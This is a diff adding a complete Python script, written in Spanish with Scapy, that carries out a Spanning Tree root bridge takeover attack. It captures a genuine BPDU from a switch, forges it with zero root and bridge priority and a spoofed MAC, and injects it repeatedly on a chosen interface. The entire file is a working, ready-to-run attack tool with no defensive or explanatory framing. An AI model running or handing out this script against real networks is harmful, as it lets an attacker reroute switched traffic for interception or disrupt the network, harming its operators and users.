@@ -1,1 +1,132 @@
-hhh
+#!/usr/bin/env python3
+
+from scapy.all import sniff, sendp, Ether, Dot3, STP
+import sys
+import os
+import time
+
+
+def verificar_root():
+    if os.geteuid() != 0:
+        print("[!] Requiere root. Usa: sudo python3 stp_root_attack.py")
+        sys.exit(1)
+
+
+def capturar_bpdu(interfaz, timeout=60):
+    print(f"[*] Escuchando BPDUs STP en {interfaz} (max {timeout}s)...")
+    print("[*] Asegurate de estar conectado a un switch con STP activo.")
+    print()
+
+    capturados = sniff(
+        iface=interfaz,
+        filter="ether dst 01:80:c2:00:00:00",
+        count=1,
+        timeout=timeout
+    )
+
+    if not capturados:
+        print("[!] No se detectaron BPDUs. Verifica la conexion al switch.")
+        return None
+
+    pkt = capturados[0]
+
+    # Los BPDUs usan Dot3 (802.3), no Ether estándar
+    if Dot3 in pkt:
+        print(f"[+] BPDU capturada desde: {pkt[Dot3].src}")
+    else:
+        print(f"[+] BPDU capturada.")
+
+    return pkt
+
+
+def preparar_bpdu_root(bpdu_original):
+    mac_atacante = "00:00:00:00:00:01"
+    bpdu_modificada = bpdu_original.copy()
+
+    # Modificar MAC origen según la capa disponible
+    if Dot3 in bpdu_modificada:
+        bpdu_modificada[Dot3].src = mac_atacante
+    elif Ether in bpdu_modificada:
+        bpdu_modificada[Ether].src = mac_atacante
+
+    if STP in bpdu_modificada:
+        bpdu_modificada[STP].rootid    = 0
+        bpdu_modificada[STP].rootmac   = mac_atacante
+        bpdu_modificada[STP].bridgeid  = 0
+        bpdu_modificada[STP].bridgemac = mac_atacante
+        bpdu_modificada[STP].pathcost  = 0
+
+    return bpdu_modificada
+
+
+def enviar_bpdus_falsas(bpdu_root, interfaz, repeticiones, intervalo):
+    print()
+    print("[*] BPDU modificada:")
+    bpdu_root.show()
+    print()
+    print(f"[*] Enviando {repeticiones} BPDUs en {interfaz}...")
+    print("[*] Ctrl+C para detener.")
+    print()
+
+    enviadas = 0
+
+    try:
+        for i in range(repeticiones):
+            sendp(bpdu_root, iface=interfaz, verbose=False)
+            enviadas += 1
+            print(f"\r[+] BPDUs enviadas: {enviadas}/{repeticiones}", end="", flush=True)
+            time.sleep(intervalo)
+
+    except KeyboardInterrupt:
+        print(f"\n[*] Interrumpido. BPDUs enviadas: {enviadas}")
+        return
+
+    print(f"\n[+] Ataque completado. Total BPDUs enviadas: {enviadas}")
+    print("[*] Verifica en el switch: show spanning-tree")
+
+
+def menu():
+    print("=" * 55)
+    print("     ATAQUE STP - RECLAMACION DE ROOT BRIDGE")
+    print("=" * 55)
+    print()
+
+    interfaz = input("[?] Interfaz de red (ej: eth0)         : ").strip() or "eth0"
+
+    while True:
+        try:
+            repeticiones = int(input("[?] Cantidad de BPDUs a enviar [100]   : ").strip() or "100")
+            if repeticiones > 0:
+                break
+            print("[!] Debe ser mayor a 0.")
+        except ValueError:
+            print("[!] Ingresa un numero valido.")
+
+    while True:
+        try:
+            intervalo = float(input("[?] Intervalo entre envios en seg [1.0] : ").strip() or "1.0")
+            if intervalo >= 0:
+                break
+            print("[!] Debe ser mayor o igual a 0.")
+        except ValueError:
+            print("[!] Ingresa un numero valido.")
+
+    return interfaz, repeticiones, intervalo
+
+
+def main():
+    verificar_root()
+    interfaz, repeticiones, intervalo = menu()
+    print()
+
+    bpdu_original = capturar_bpdu(interfaz)
+    if not bpdu_original:
+        sys.exit(1)
+
+    bpdu_root = preparar_bpdu_root(bpdu_original)
+    enviar_bpdus_falsas(bpdu_root, interfaz, repeticiones, intervalo)
+
+
+if __name__ == "__main__":
+    main()
+
